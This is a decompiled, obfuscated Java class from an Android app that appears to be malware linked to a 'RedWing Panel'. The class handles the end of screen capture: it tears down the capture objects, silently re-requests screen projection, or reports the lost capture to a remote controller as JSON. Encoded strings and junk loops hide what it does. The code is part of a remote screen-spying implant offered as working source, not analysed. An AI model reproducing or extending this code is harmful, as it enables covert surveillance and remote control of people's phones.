package v.s;

import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.util.TypefaceCache;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UNAwTmTJsIvJq8hDkMmf extends MediaProjection.Callback {
    public final /* synthetic */ int dDIMxZXP1V8HdM;
    public final /* synthetic */ ManagerUMController w9sT1Swbhx3hs;

    public /* synthetic */ UNAwTmTJsIvJq8hDkMmf(ManagerUMController managerUMController, int i) {
        this.dDIMxZXP1V8HdM = i;
        this.w9sT1Swbhx3hs = managerUMController;
    }

    @Override // android.media.projection.MediaProjection.Callback
    public final void onStop() {
        switch (this.dDIMxZXP1V8HdM) {
            case 0:
                String str = ManagerUMController.DVTNwpDEVsUKuznof;
                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7003000620054009700E000BA00D600E70021006F001B009400E900AC00C600A2002E");
                ManagerUMController managerUMController = this.w9sT1Swbhx3hs;
                synchronized (managerUMController.gIIiyi2ddlMDR0) {
                    try {
                        VirtualDisplay virtualDisplay = managerUMController.w9sT1Swbhx3hs;
                        if (virtualDisplay != null) {
                            virtualDisplay.release();
                        }
                        break;
                    } catch (Exception unused) {
                    }
                    while (System.currentTimeMillis() == Long.MIN_VALUE) {
                        Runtime.getRuntime().totalMemory();
                    }
                    managerUMController.w9sT1Swbhx3hs = null;
                    ImageReader imageReader = managerUMController.vekpFI4d1Nc4fakF;
                    if (imageReader != null) {
                        imageReader.setOnImageAvailableListener(null, null);
                    }
                    try {
                        ImageReader imageReader2 = managerUMController.vekpFI4d1Nc4fakF;
                        if (imageReader2 != null) {
                            imageReader2.close();
                        }
                        break;
                    } catch (Exception unused2) {
                    }
                    managerUMController.vekpFI4d1Nc4fakF = null;
                }
                this.w9sT1Swbhx3hs.b1EoSIRjJHO5();
                String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
                ManagerUMController.ECwLkmPW1UKz7J6E = false;
                ManagerUMController managerUMController2 = this.w9sT1Swbhx3hs;
                managerUMController2.dDIMxZXP1V8HdM = null;
                Intent intent = managerUMController2.xDyLpEZyrcKVe0;
                if (intent != null && Build.VERSION.SDK_INT < 34) {
                    TypefaceCache.obtain("001000730057008100BD00B700D700A6002F002C001B009500F500AC00C600A6003100620052008900F700FF00D100A600330062004E009500F500FF00C500AE0037007E001B009400E400B000C000A200270036004B009500FF00B500D700A40037007F0054008900B000F700F30097000A0036000700C700A300EB009B");
                    Handler handler = this.w9sT1Swbhx3hs.gmNWMfvn6zlEj;
                    if (handler == null) {
                        handler = new Handler(Looper.getMainLooper());
                    }
                    handler.postDelayed(new A68NpXPqwTFos99nt(this.w9sT1Swbhx3hs, (-13) + 27, intent), 1000L);
                    return;
                }
                if (Build.VERSION.SDK_INT >= 34) {
                    TypefaceCache.obtain("00020046007200C700A300EB009900FD006300660049008800FA00BA00D100B3002A0079005500C700E200BA00C400A800280073005F00CB00B000B100DD00B3002A00700042008E00FE00B800920091000D0055001B008400FC00B600D700A90037");
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                    if (rWY6BVSB0XxPbw != null) {
                        TypefaceCache.obtain("001300640054008D00F500BC00C600AE002C0078001B008B00FF00AC00C600E7006B0057006B00AE00B000EC008600EC006A003A001B008900FF00AB00DB00A1003A007F0055008000B000AC00D700B5003500730049");
                        rWY6BVSB0XxPbw.XiR1pIn5878vVWd = false;
                        try {
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003300640054008D00F500BC00C600AE002C00780064008B00FF00AC00C6"));
                            jSONObject.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00AE0027"), rWY6BVSB0XxPbw.w9sT1Swbhx3hs);
                            rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                            return;
                        } catch (Exception unused3) {
                            return;
                        }
                    }
                    return;
                }
                return;
            default:
                String str3 = ManagerUMController.DVTNwpDEVsUKuznof;
                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7003000620054009700E000BA00D600E7006B005E006D00A900D300F6");
                this.w9sT1Swbhx3hs.ibVTtJUNfrGYbW();
                return;
        }
    }
}
